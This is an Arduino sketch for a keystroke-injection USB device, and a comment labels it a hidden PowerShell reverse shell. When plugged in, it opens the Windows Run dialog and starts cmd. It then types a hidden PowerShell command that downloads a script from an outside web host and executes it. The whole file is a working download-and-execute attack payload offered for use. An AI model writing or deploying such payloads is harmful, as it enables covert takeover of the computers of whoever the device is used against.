void setup() {
  // reverse_shell with powershell(hidden)
  // edit by xy 16.01.24
  // mail:i@cdxy.me
  
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.print("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://zysgmzb.club/hello/yuanshen.ps1');");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2500);
}

void loop() {}
